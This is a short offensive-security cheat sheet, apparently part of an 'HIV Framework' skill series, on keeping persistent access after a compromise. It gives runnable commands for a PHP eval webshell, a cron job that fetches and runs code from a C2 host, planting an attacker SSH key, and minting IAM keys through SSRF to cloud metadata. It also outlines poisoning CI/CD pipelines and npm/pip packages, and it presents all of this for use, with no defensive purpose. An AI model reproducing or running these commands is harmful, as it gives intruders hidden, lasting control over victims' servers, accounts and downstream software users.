# Stage 4: Integration — Persistence (Provirus)

> Integrase: DNA virus disisipkan ke kromosom sel. Jadi bagian dari DNA host.
> Persistence: embedded ke host, survive session kill + partial remediation.

## Persistence Tiers

| Tier | Type | Survives |
|---|---|---|
| 1 | Session token | Nothing — weak |
| 2 | OAuth app / API key / webhook | Logout, password reset |
| 3 | Webshell / Cron / IAM key | Account reset |
| 4 | CI/CD pipeline / supply chain | Almost everything |

## Tier 2: Account-level

```
OAuth app authorization in victim account
→ remains even after password reset
→ requires victim to explicitly remove

API key created under victim account
→ separate from password — often not rotated

Webhook registered to attacker server
→ fires on every relevant event automatically
```

## Tier 3: Infrastructure-level

```bash
# Webshell
echo '<?php @eval(base64_decode(@$_POST["x"]));?>' > /var/www/html/cache/x.php

# Cron
(crontab -l 2>/dev/null; echo "*/20 * * * * curl -sk https://C2/b?h=$(hostname)|bash") | crontab -

# SSH key
mkdir -p ~/.ssh && echo "ssh-rsa ATTACKER_KEY" >> ~/.ssh/authorized_keys

# SSRF → IAM → parallel access key
# 1. curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 2. aws iam create-access-key --user-name [user]
# 3. Key persists even if original role is rotated
```

## Tier 4: Supply Chain

```
CI/CD: add malicious step to pipeline
→ runs on every deploy automatically
→ re-infects if other persistence is cleaned

npm/pip package: if access to package repo
→ infects all downstream consumers
```

## The Provirus Principle

Best persistence = INVISIBLE AT REST:
- Zero outbound traffic when dormant
- Looks like legitimate artifact when inspected  
- Multiple independent layers

*Stage 4: Integration/Persistence | HIV Framework | Security--Skill*
